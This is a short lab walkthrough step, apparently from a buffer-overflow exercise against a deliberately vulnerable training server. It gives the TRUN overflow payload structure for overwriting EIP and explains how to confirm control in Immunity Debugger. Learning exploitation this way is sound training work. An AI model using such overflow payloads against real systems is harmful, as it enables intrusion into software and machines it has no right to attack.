# 4. Overwriting the EIP

**Goal:** Confirm control over EIP by sending a buffer with:
- 2003 junk characters (A)
- 4 overwrite characters (B)
- Additional padding (C)

---

## 📦 Payload Structure

"TRUN /.:/" + "A"*2003 + "B"*4 + "C"*100

yaml
Copy
Edit

---

## ✅ Run:

```bash
python3 eip.py
🧠 What to Look For in Immunity:
EIP = 42424242 → means B (hex 0x42) successfully overwrote EIP
